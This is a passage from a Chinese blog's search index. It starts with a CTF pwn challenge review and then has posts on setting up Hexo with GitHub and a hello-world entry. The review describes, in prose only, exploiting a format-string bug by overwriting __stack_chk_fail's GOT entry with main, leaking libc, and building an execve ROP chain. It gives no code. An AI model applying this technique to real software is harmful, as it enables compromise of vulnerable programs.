mov    esi, 0x10<br>   0x55555555545a &lt;main+251&gt;    mov    edx, 0<br>   0x55555555545f &lt;main+256&gt;    div    rsirax:0x3rd:0x7<br>   0x555555555462 &lt;main+259&gt;    imul   rax, rax, 0x10 rax:0x30<br></code></pre></td></tr></table></figure></li></ul><h3 id="4-fmt"><a href="#4-fmt" class="headerlink" title="4 fmt"></a>4 fmt</h3><ul><li><p>好好好 没有师傅用预期方法 菜狗爆哭 师傅们都太强了 </p></li><li><p>我都不道会有stack_chk_fail的利用 那其实能利用多次的话就完全不用给后门了 师傅们好像也没用（555555 有一个（蔚蓝师傅用了fini_array pANz0e师傅用了fini_array没有泄露libc 又改stack_chk_fail泄露然后利用后门</p></li><li><blockquote><p>读了题目都知道是格式化字符串漏洞了，但是正常情况下只能使用一次，这显然是无法让我们拿到shell的。</p><p>刚开始往格式化字符串泄露canary然后构造ROP的办法来想的，但是意识到第一步获得了canary又能干什么呢？啥都干不了，就exit了。所以我们不能这么平庸地看问题。</p><p>考虑到绕过Canary，不如与其正面硬刚，直接让Canary失效。</p><p>众所周知，如果程序检测到Canary被更改了，那么就会在函数结束的时候调用<strong>stk_chk_fail</strong>这个函数，然后就退出了。但是我们正是可以利用这一点，用格式化字符串更改stk_chk_fail的got表地址为main函数地址，那么就可以构造较长的payload来修改Canary从而可以无限次调用main函数，也是可以通过较短的payload不修改Canary来达到不接着调用</p><p>函数直接ret的效果。</p><p>既然可以控制main函数的执行了，那么我们也就可以控制格式化字符串漏洞的利用了。</p><p>于是我们这样利用漏洞：</p><p>1.第一次格式化字符串漏洞：修改__stk_chk_fail函数的got表地址为main函数地址。</p><p>2.第二次格式化字符串漏洞：获取栈上面__libc_start_main+128的地址。</p><p>3.第三次格式化字符串漏洞：构建并且输入ROP，但是这里payload的长度肯定会覆盖Canary，因此我们这里一定会进入下一层main函数，但是在下一层main函数我们随便传一个短短的字符串就行了，就可以不修改Canary从而达到退出执行上一层main函数输入的ROP的效果。</p><p>这里输入用的是scanf，遇到0d会截断，亲测system似乎打不通（我只试了本地，远程不知道），反正都有libc基址了，啥gedgets就都有了，而且ROP空间充足那么我们倒不如直接调用成功率更大的execve（X1ngCHEN师傅</p></blockquote><p>然后这里还有个问题就是高版本rop的话没有pop_rdi_ret的这种gadget 于是师傅们用了libc里的<br>上面还说到system打不通 有的师傅用了execve 有的用的onegaget</p></li><li><p>magicode和这题enllus1on师傅都拿了一血 magicode不用多说 应该是做过fcalc那个题 这个题写的exp看不懂（最强双非22级是吧 瑟瑟发抖</p></li><li><p>sublime text ctrl shif L多行编辑</p></li></ul><h3 id="5-风水小狮"><a href="#5-风水小狮" class="headerlink" title="5 风水小狮"></a>5 风水小狮</h3><ul><li>emmmm 这个应该没啥注意的 都是预期解</li></ul><h3 id="6-风水中狮"><a href="#6-风水中狮" class="headerlink" title="6 风水中狮"></a>6 风水中狮</h3><ul><li>又是enllus1on师傅 唯一解 真的强 %50$p和 %51%p都是flag的地址</li><li>沃趣 好像给的解释错了 给师傅们磕一个</li></ul><h3 id="7-风水大狮"><a href="#7-风水大狮" class="headerlink" title="7 风水大狮"></a>7 风水大狮</h3><ul><li>好家伙 田总说加载沙箱的代码忘写了 非预期了 没有绕沙箱也能做的 好家伙 除了Ephemeral1y师傅用了看不懂的链子<br>怪我怪我 没审好题</li><li>如果有沙箱的话 就得绕 但还没看懂</li></ul><h3 id="8-easyweb"><a href="#8-easyweb" class="headerlink" title="8 easyweb"></a>8 easyweb</h3><ul><li>就X1ngCHEN师傅的唯一解呢 预期解 看看就欧克</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo+github博客搭建</title>
    <link href="/2023/09/08/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/09/08/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<ul><li><p>贴一下参考链接</p><blockquote><p><a href="https://blog.csdn.net/weixin_45019350/article/details/121901433">https://blog.csdn.net/weixin_45019350/article/details/121901433</a></p><p><a href="https://zhuanlan.zhihu.com/p/60578464">https://zhuanlan.zhihu.com/p/60578464</a></p></blockquote></li><li><p>主题用的是<code>fluid</code></p><p>主题更换参考链接</p><blockquote><p><a href="https://blog.csdn.net/weixin_51545953/article/details/128499341">https://blog.csdn.net/weixin_51545953/article/details/128499341</a></p><p><a href="https://blog.csdn.net/weixin_49270402/article/details/117672195">https://blog.csdn.net/weixin_49270402/article/details/117672195</a> 里面的小彩蛋有图片网站(good)</p></blockquote></li><li><p>以管理员身份进入终端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">切换到`d盘myblog`下<br>d:<br>cd my blog<br><br>修改配置信息<br><br>hexo clean<br>hexo g<br>hexo s# 就可以生成静态的页面，预览效果<br>hexo d# 部署到github上 可能会出现错误 多试几次就好<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">出现这些提示信息就部署上去了</span><br>Delta compression using up to 8 threads<br>Compressing objects: 100% (53/53), done.<br>Writing objects: 100% (81/81), 5.03 MiB | 628.00 KiB/s, done.<br>Total 81 (delta 33), reused 0 (delta 0), pack-reused 0<br>remote: Resolving deltas: 100% (33/33), completed with 7 local objects.<br>To https://github.com/yech0/yech0.github.io<br>   6165f62..b080b14  HEAD -&gt; master<br>Branch &#x27;master&#x27; set up to track remote branch &#x27;master&#x27; from &#x27;https://github.com/yech0/yech0.github.io&#x27;.<br>[32mINFO [39m Deploy done: [35mgit[39m<br></code></pre></td></tr></table></figure></li><li><p>还有个问题就是背景图片加载太慢了 我已经尽量压缩了 但还是慢（就图片慢 其他的效果很快的</p><p><del>会不会换个源会好一点？下次试试</del></p><p>用Google打开会快一点 火狐比较慢，</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/08/24/hello-world/"/>
    <url>/2023/08/24/hello-world/</url>
    
    <content type="html"><![CDATA[<p>你发现了我<code>(*^_^*)</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
